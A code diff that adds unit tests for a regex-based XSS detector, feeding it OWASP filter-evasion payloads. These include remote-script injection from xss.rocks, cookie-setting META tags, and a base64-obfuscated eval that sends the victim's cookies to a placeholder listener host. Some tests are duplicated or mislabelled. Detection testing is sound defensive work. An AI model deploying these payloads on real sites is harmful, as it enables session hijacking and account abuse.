@@ -852,4 +852,283 @@ describe('Regex Matching', function() {
         assert.equal(result[0], true);
         assert.equal(result[1].length, 2);
     })
+
+    /*
+    *   PHP
+    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#php
+    */
+    it('should match PHP', function() {
+        const testString = `<? echo('<SCR)';
+                            echo('IPT>alert("XSS")</SCRIPT>'); ?>`;
+        
+        const result = findHTMLSVG(testString);
+
+        assert.equal(result[0], true);
+        assert.equal(result[1].length, 2);
+    })
+
+    /*
+    *   IMG Embedded Commands
+    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-embedded-commands
+    */
+    it('should match IMG Embedded Commands', function() {
+        const testString = `<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">`;
+        
+        const result = findHTMLSVG(testString);
+
+        assert.equal(result[0], true);
+        assert.equal(result[1].length, 2);
+    })
+
+    /*
+    *   IMG Embedded Commands
+    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-embedded-commands
+    */
+    it('should match IMG Embedded Commands', function() {
+        const testString1 = `<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">`;
+        const testString2 = `Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser`;
+        
+        const result1 = findHTMLSVG(testString1);
+        const result2 = findHTMLSVG(testString2);
+
+        assert.equal(result1[0], true);
+        assert.equal(result1[1].length, 2);
+
+        assert.equal(result2[0], true);
+        assert.equal(result2[1].length, 2);
+    })
+
+    /*
+    *   Cookie Manipulation
+    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#cookie-manipulation
+    */
+    it('should match cookie manipulation', function() {
+        const testString = `<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`;
+        
+        const result = findHTMLSVG(testString);
+
+        assert.equal(result[0], true);
+        assert.equal(result[1].length, 2);
+    })
+
+    /*
+    *   XSS Using HTML Quote Encapsulation
+    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-using-html-quote-encapsulation
+    */
+    it('should match XSS Using HTML Quote Encapsulation', function() {
+        const testString1 = `<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
+        const testString2 = `<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
+        const testString3 = `<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
+        const testString4 = `<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
+        const testString5 = `<SCRIPT a=\`>\` SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
+        const testString6 = `<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
+        const testString7 = `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
+
+        const result1 = findHTMLSVG(testString1);
+        const result2 = findHTMLSVG(testString2);
+        const result3 = findHTMLSVG(testString3);
+        const result4 = findHTMLSVG(testString4);
+        const result5 = findHTMLSVG(testString5);
+        const result6 = findHTMLSVG(testString6);
+        const result7 = findHTMLSVG(testString7);
+
+        assert.equal(result1[0], true);
+        assert.equal(result1[1].length, 2);
+
+        assert.equal(result2[0], true);
+        assert.equal(result2[1].length, 2);
+
+        assert.equal(result3[0], true);
+        assert.equal(result3[1].length, 2);
+
+        assert.equal(result4[0], true);
+        assert.equal(result4[1].length, 2);
+
+        assert.equal(result5[0], true);
+        assert.equal(result5[1].length, 2);
+
+        assert.equal(result6[0], true);
+        assert.equal(result6[1].length, 2);
+
+        assert.equal(result7[0], true);
+        assert.equal(result7[1].length, 2);
+    })
+
+    /*
+    *   URL String Evasion
+    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#url-string-evasion
+    */
+    it('should match URL String Evasion', function() {
+        const testString1 = `<A HREF="http://66.102.7.147/">XSS</A>`;
+        const testString2 = `<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>`;
+        const testString3 = `<A HREF="http://1113982867/">XSS</A>`;
+        const testString4 = `<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>`;
+        const testString5 = `<A HREF="http://0102.0146.0007.00000223/">XSS</A>`;
+        const testString6 = `<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">`;
+        const testString7 = `<A HREF="h
+                            tt  p://6   6.000146.0x7.147/">XSS</A>`;
+        const testString8 = `<A HREF="//www.google.com/">XSS</A>`;
+        const testString9 = `<A HREF="http://google.com/">XSS</A>`;
+        const testString10 = `<A HREF="http://www.google.com./">XSS</A>`;
+        const testString11 = `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`;
+        const testString12 = `<A HREF="http://www.google.com/ogle.com/">XSS</A>`;            
+
+        const result1 = findHTMLSVG(testString1);
+        const result2 = findHTMLSVG(testString2);
+        const result3 = findHTMLSVG(testString3);
+        const result4 = findHTMLSVG(testString4);
+        const result5 = findHTMLSVG(testString5);
+        const result6 = findHTMLSVG(testString6);
+        const result7 = findHTMLSVG(testString7);
+        const result8 = findHTMLSVG(testString8);
+        const result9 = findHTMLSVG(testString9);
+        const result10 = findHTMLSVG(testString10);
+        const result11 = findHTMLSVG(testString11);
+        const result12 = findHTMLSVG(testString12);
+
+        assert.equal(result1[0], true);
+        assert.equal(result1[1].length, 2);
+
+        assert.equal(result2[0], true);
+        assert.equal(result2[1].length, 2);
+
+        assert.equal(result3[0], true);
+        assert.equal(result3[1].length, 2);
+
+        assert.equal(result4[0], true);
+        assert.equal(result4[1].length, 2);
+
+        assert.equal(result5[0], true);
+        assert.equal(result5[1].length, 2);
+
+        assert.equal(result6[0], true);
+        assert.equal(result6[1].length, 2);
+
+        assert.equal(result7[0], true);
+        assert.equal(result7[1].length, 2);
+
+        assert.equal(result8[0], true);
+        assert.equal(result8[1].length, 2);
+
+        assert.equal(result9[0], true);
+        assert.equal(result9[1].length, 2);
+
+        assert.equal(result10[0], true);
+        assert.equal(result10[1].length, 2);
+
+        assert.equal(result11[0], true);
+        assert.equal(result11[1].length, 2);
+
+        assert.equal(result12[0], true);
+        assert.equal(result12[1].length, 2);
+    })
+
+    /*
+    *   Assisting XSS with HTTP Parameter Pollution
+    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#assisting-xss-with-http-parameter-pollution
+    */
+    it('should match Assisting XSS with HTTP Parameter Pollution', function() {
+        const testString1 = `a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>`;
+        const testString2 = `<script>
+                            var contentType = <%=Request.getParameter("content_type")%>;
+                            var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
+                            ...
+                            //some user agreement and sending to server logic might be here
+                            ...
+                            </script>`;
+        const testString3 = `<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>`;
+        const testString4 = `<script>
+                            var contentType = 1; alert(1);
+                            var title = "This is a regular title";
+                            …
+                            //some user agreement and sending to server logic might be here
+                            …
+                            </script>`;         
+
+        const result1 = findHTMLSVG(testString1);
+        const result2 = findHTMLSVG(testString2);
+        const result3 = findHTMLSVG(testString3);
+        const result4 = findHTMLSVG(testString4);
+
+        assert.equal(result1[0], true);
+        assert.equal(result1[1].length, 2);
+
+        assert.equal(result2[0], true);
+        assert.equal(result2[1].length, 2);
+
+        assert.equal(result3[0], true);
+        assert.equal(result3[1].length, 2);
+
+        assert.equal(result4[0], true);
+        assert.equal(result4[1].length, 2);
+    })
+
+    /*
+    *   Character Escape Sequences
+    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#character-escape-sequences
+    */
+    it('should match URL String Evasion', function() {
+        const testString1 = `<A HREF="http://66.102.7.147/">XSS</A>`;
+        const testString2 = `<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>`;
+        const testString3 = `<A HREF="http://1113982867/">XSS</A>`;
+        const testString4 = `<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>`;
+        const testString5 = `<A HREF="http://0102.0146.0007.00000223/">XSS</A>`;
+        const testString6 = `<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">`;
+        const testString7 = `<A HREF="h
+                            tt  p://6   6.000146.0x7.147/">XSS</A>`;
+        const testString8 = `<A HREF="//www.google.com/">XSS</A>`;
+        const testString9 = `<A HREF="http://google.com/">XSS</A>`;
+        const testString10 = `<A HREF="http://www.google.com./">XSS</A>`;
+        const testString11 = `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`;
+        const testString12 = `<A HREF="http://www.google.com/ogle.com/">XSS</A>`;            
+
+        const result1 = findHTMLSVG(testString1);
+        const result2 = findHTMLSVG(testString2);
+        const result3 = findHTMLSVG(testString3);
+        const result4 = findHTMLSVG(testString4);
+        const result5 = findHTMLSVG(testString5);
+        const result6 = findHTMLSVG(testString6);
+        const result7 = findHTMLSVG(testString7);
+        const result8 = findHTMLSVG(testString8);
+        const result9 = findHTMLSVG(testString9);
+        const result10 = findHTMLSVG(testString10);
+        const result11 = findHTMLSVG(testString11);
+        const result12 = findHTMLSVG(testString12);
+
+        assert.equal(result1[0], true);
+        assert.equal(result1[1].length, 2);
+
+        assert.equal(result2[0], true);
+        assert.equal(result2[1].length, 2);
+
+        assert.equal(result3[0], true);
+        assert.equal(result3[1].length, 2);
+
+        assert.equal(result4[0], true);
+        assert.equal(result4[1].length, 2);
+
+        assert.equal(result5[0], true);
+        assert.equal(result5[1].length, 2);
+
+        assert.equal(result6[0], true);
+        assert.equal(result6[1].length, 2);
+
+        assert.equal(result7[0], true);
+        assert.equal(result7[1].length, 2);
+
+        assert.equal(result8[0], true);
+        assert.equal(result8[1].length, 2);
+
+        assert.equal(result9[0], true);
+        assert.equal(result9[1].length, 2);
+
+        assert.equal(result10[0], true);
+        assert.equal(result10[1].length, 2);
+
+        assert.equal(result11[0], true);
+        assert.equal(result11[1].length, 2);
+
+        assert.equal(result12[0], true);
+        assert.equal(result12[1].length, 2);
+    })
 });
